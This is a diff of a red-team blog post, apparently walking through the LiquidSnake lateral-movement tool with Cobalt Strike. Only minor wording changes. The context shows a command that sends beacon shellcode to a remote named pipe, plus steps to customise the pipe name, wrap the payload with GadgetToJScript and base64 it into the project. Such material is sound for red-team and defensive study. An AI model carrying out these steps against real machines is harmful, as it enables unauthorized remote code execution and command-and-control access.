@@ -28,7 +28,7 @@ Make sure to wait for the full output to be received before continuing - during 
 The author has a [BOF](https://github.com/RiccardoAncarani/BOFs/tree/master/send_shellcode_via_pipe) and aggressor script which can be used to deliver our beacon shellcode to the listening pipe. I've generated some stageless beacon shellcode tied to the HTTPS listener to send. First, load up the aggressor script:
 ![Aggressor Script](/assets/posts/liquidsnake/import_aggressorscript.png){: .mx-auto.d-block :}
 
-Lastly, just deliver the shellcode:
+Deliver the shellcode:
 ~~~
 send_shellcode_via_pipe \\oxenfurt\pipe\6e7645c4-32c5-4fe3-aabf-e94c2f4370e7 /opt/aggressor/beacon.bin
 ~~~
@@ -48,7 +48,7 @@ IntPtr hPipe = CreateNamedPipe("\\\\.\\pipe\\MyNewPipeName")
 Make sure the project architecture is set to `x64` and compile. To work the edit into LiquidSnake, [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript) is used:
 ![GadgetToJScript](/assets/posts/liquidsnake/gadgettojscript.png){: .mx-auto.d-block :}
 
-Base64 up the resulting `.vbs` file:
+Base64 up the resulting `test.vbs` file:
 ![Base64 VBS](/assets/posts/liquidsnake/b64_gadget.png){: .mx-auto.d-block :}
 
 Paste that string into the LiquidSnake solution in `Program.cs` on line `29`:
@@ -59,5 +59,5 @@ string vbscript64 = "RnVuY3Rbpb24gQmFzZTY0VG9..."
 Recompile the project and it's back over to Cobalt Strike. Repeat the previously used beacon commands, except this time sub in your custom named pipe value when running `send_shellcode_via_pipe`:
 ![Modded LiquidSname](/assets/posts/liquidsnake/modded_snake_exec.png){: .mx-auto.d-block :}
 
-Third beacon, this one using the custom pipe name:
+And we receive our third beacon, this one using the custom pipe name:
 ![Third Beacon](/assets/posts/liquidsnake/3rd_beacon.png){: .mx-auto.d-block :}
